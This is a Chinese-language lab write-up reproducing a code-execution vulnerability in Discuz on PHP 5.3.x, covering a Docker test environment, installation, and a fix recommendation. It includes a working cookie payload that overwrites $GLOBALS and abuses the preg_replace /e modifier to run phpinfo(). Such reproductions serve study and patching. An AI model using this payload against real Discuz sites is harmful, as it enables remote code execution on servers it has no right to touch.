由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致$_REQUEST中不再包含$_COOKIE，我们通过在Cookie中传入$GLOBALS来覆盖全局变量，造成代码执行漏洞。

## 漏洞环境搭建：

    
    
    docker-compose up -d

![1621579278_60a7560edfc6ce3fa5703.jpg!small](https://image.3001.net/images/20210521/1621579278_60a7560edfc6ce3fa5703.jpg!small)

拉取成功

![1621579285_60a756157a11c52cb285b.png!small](https://image.3001.net/images/20210521/1621579285_60a756157a11c52cb285b.png!small)

启动后，访问http://your-ip:8080/install/来安装discuz，数据库地址填写db，数据库名为

discuz，数据库账号密码均为root。

![1621579308_60a7562c1125fe1b2a666.png!small](https://image.3001.net/images/20210521/1621579308_60a7562c1125fe1b2a666.png!small)

![1621579313_60a756319d8cce057ffdc.png!small](https://image.3001.net/images/20210521/1621579313_60a756319d8cce057ffdc.png!small)

![1621579326_60a7563ea17908f897ec1.png!small](https://image.3001.net/images/20210521/1621579326_60a7563ea17908f897ec1.png!small)

![1621579334_60a75646d137b9555431c.png!small](https://image.3001.net/images/20210521/1621579334_60a75646d137b9555431c.png!small)

来到主页

![1621579344_60a756509ba739af8599b.png!small](https://image.3001.net/images/20210521/1621579344_60a756509ba739af8599b.png!small)

## 漏洞复现

管理员登录，随便找到一个帖子，抓包

![1621579353_60a756594d620a8fd5cd0.png!small](https://image.3001.net/images/20210521/1621579353_60a756594d620a8fd5cd0.png!small)

在repeater模块向其发送数据包，并在Cookie中增加

    
    
    GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();

![1621579362_60a75662c322aba853e6e.png!small](https://image.3001.net/images/20210521/1621579362_60a75662c322aba853e6e.png!small)

成功代码执行

建议：更改php 5.3.x里的php.ini设置，设置request_order为GPC或更新最新版Discuz版本

